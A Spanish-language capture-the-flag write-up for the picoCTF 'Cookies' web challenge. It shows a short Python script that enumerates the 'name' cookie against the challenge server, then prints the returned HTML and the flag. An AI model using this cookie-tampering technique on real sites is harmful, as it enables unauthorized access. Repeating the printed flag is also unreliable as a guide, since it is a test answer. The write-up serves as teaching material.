# Cookies

## Descripción
Who doesn't love cookies? Try to figure out the best one.
## Solución
### Solución:
Lo primero al entrar a la página que nos entregan, vemos estos dos botones, cada uno cambia el fondo al color correspondiente
![[02Cookies1.png]]

Al intentar ingresar algo, obtenemos esto
![[02Cookies3.png]]

Pero si ingresamos 'snickerdoodle', la sugerencia que nos da la página misma, podemos pasar de 'la puerta'. Y notamos que tenemos una cookie de valor de 0, y si es que cambiamos este valor, obtendremos otro sabor de 'galleta' pero sin obtener la bandera
![[02Cookies2.png]]

Entonces, lo siguiente que haremos es desarrollar un exploit en python para "minar" la respuesta correcta, probando todas las posibles respuestas
```
import requests

url = "http://wily-courier.picoctf.net:57578/check"

for i in range(21):
        cookies = {"name" : '{}'.format(i)}
        r = requests.get(url, cookies = cookies)

        if 'picoCTF{' in r.text:
                print(r.text)
```

Al ejecutar el código del exploit, obtenemos esta respuesta, donde se encuentra nuestra bandera
```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Cookies</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>
<body>
    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
</code></p>
        </div>
        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>
    </div>
</body>
</html>
```

picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
## Notas
